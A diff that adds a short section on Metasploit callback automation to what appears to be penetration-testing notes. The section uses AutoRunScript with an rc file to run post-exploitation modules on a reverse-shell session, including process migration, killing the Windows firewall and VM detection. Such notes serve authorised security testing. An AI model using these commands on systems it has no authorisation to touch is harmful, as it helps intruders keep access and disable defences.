@@ -163,5 +163,23 @@ Resources:
  https://www.routerpasswords.com
 ```
 
+# Metasploit Callback Automation:
+
+Use AutoRunScript to run commands on a reverse shell callback
+
+```
+set AutoRunScript multi_console_command -rc /root/commands.rc
+```
+
+`/root/commands.rc` contains the commands you wish to run
+
+Example:
+
+```
+run post/windows/manage/migrate
+run post/windows/manage/killfw
+run post/windows/gather/checkvm
+```
+
 
  
